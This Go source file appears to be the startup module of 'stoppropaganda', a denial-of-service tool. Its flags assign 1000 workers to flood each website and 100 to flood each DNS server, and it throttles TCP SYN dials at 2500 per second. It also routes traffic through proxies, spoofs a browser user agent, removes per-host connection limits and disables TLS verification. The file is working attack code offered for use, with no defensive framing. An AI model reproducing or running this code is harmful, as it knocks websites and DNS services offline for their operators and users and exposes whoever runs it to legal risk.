package stoppropaganda

import (
	"crypto/tls"
	"flag"
	"log"
	"math"
	"math/rand"
	"net"
	"os"
	"time"

	"github.com/erkexzcx/stoppropaganda/internal/customresolver"
	"github.com/erkexzcx/stoppropaganda/internal/customtcpdial"
	"github.com/erkexzcx/stoppropaganda/internal/sockshttp"
	"github.com/miekg/dns"
	"github.com/peterbourgon/ff/v3"
	"github.com/valyala/fasthttp"
)

var fs = flag.NewFlagSet("stoppropaganda", flag.ExitOnError)
var (
	flagBind            = fs.String("bind", ":8049", "bind on specific host:port")
	flagWorkers         = fs.Int("workers", 1000, "DOS each website with this amount of workers")
	flagTimeout         = fs.Duration("timeout", 120*time.Second, "timeout of HTTP request")
	flagDNSWorkers      = fs.Int("dnsworkers", 100, "DOS each DNS server with this amount of workers")
	flagDNSTimeout      = fs.Duration("dnstimeout", time.Second, "timeout of DNS request")
	flagUserAgent       = fs.String("useragent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "User agent used in HTTP requests")
	flagDialsPerSecond  = fs.Int("dialspersecond", 2500, "maximum amount of TCP SYN packets sent per second (from fasthttp)")
	flagDialConcurrency = fs.Int("dialconcurrency", 2000, "number of cuncurrent dial at any moment (from fasthttp)")
	flagProxy           = fs.String("proxy", "", "list of comma separated proxies to be used for websites DOS")
	flagProxyBypass     = fs.String("proxybypass", "", "list of comma separated IP addresses, CIDR ranges, zones (*.example.com) or a hostnames (e.g. localhost) that needs to bypass used proxy")
	flagAlgorithm       = fs.String("algorithm", "fair", "allowed algorithms are 'fair' and 'rr' (refer to README.md documentation)")
)

func Start() {
	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))
	log.Println("Starting...")

	initWebsites()
	initDNS()
	startWebsites()
	startDNS()

	log.Println("Started!")
	panic(fasthttp.ListenAndServe(*flagBind, fasthttpRequestHandler))
}

func init() {
	rand.Seed(time.Now().UnixNano())
	go tcpSynDialTicketsRoutine()
}

func initDNS() {
	// Create DNS client and dialer
	dnsClient = new(dns.Client)
	dnsClient.Dialer = &net.Dialer{
		Timeout: *flagDNSTimeout,
	}
}

func initWebsites() {
	// Create HTTP client
	httpClient = &fasthttp.Client{
		ReadTimeout:                   *flagTimeout,
		WriteTimeout:                  *flagTimeout,
		MaxIdleConnDuration:           time.Hour,
		NoDefaultUserAgentHeader:      true,
		DisableHeaderNamesNormalizing: true,
		DisablePathNormalizing:        true,
		MaxConnsPerHost:               math.MaxInt,
		Dial:                          makeDialFunc(),
		TLSConfig:                     &tls.Config{InsecureSkipVerify: true},
	}
}

func makeDialFunc() fasthttp.DialFunc {
	masterDialer := sockshttp.Initialize(*flagProxy, *flagProxyBypass)
	myResolver := customresolver.MasterStopPropagandaResolver
	dial := (&customtcpdial.CustomTCPDialer{
		DialTicketsC:     newConnTicketC,
		Concurrency:      *flagDialConcurrency,
		DNSCacheDuration: 5 * time.Minute,

		// stoppropaganda's implementation
		ParentDialer: masterDialer,
		Resolver:     myResolver,
	}).Dial
	return dial
}

var newConnTicketC = make(chan bool, 100)

func tcpSynDialTicketsRoutine() {
	perSecond := *flagDialsPerSecond
	interval := time.Second / time.Duration(perSecond)
	for {
		newConnTicketC <- true
		time.Sleep(interval)
	}
}
